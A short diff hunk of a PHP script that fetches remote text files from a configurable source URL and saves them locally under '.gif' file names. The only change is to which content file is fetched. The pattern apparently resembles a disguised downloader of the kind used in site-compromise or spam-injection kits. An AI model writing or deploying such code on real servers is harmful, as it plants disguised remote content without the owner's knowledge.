@@ -48,7 +48,7 @@ $key2=$sourceurl.$rdm2.'L_key.txt';
 $keys2=file_get_contents($key2);
 file_put_contents("0010.gif", $keys2);
 
-$content=file_get_contents($sourceurl."content.txt");
+$content=file_get_contents($sourceurl."content_html.txt");
 file_put_contents("0011.gif", $content);
 
 $add=file_get_contents($sourceurl."cy7z_php_news.txt");
